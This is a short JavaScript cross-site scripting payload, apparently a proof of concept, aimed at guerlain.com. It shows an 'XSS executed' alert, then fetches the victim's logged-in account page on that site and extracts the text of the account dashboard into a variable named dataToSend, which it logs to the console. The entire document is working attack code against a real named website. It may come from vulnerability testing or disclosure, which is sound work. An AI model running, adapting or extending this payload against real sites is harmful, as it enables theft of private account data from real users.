(async function(){
  try {

    alert('XSS executed');

    const resp1 = await fetch('https://www.guerlain.com/fr/fr-fr/account');
    const page = await resp1.text();
    
    const doc = new DOMParser().parseFromString(page, 'text/html');
    const element = doc.querySelector('.dashboard-content.container');
    const dataToSend = element ? element.textContent.trim() : null;

    console.log(dataToSend);

  } catch (err) {
    console.error('Erreur détectée :', err);
  }
})();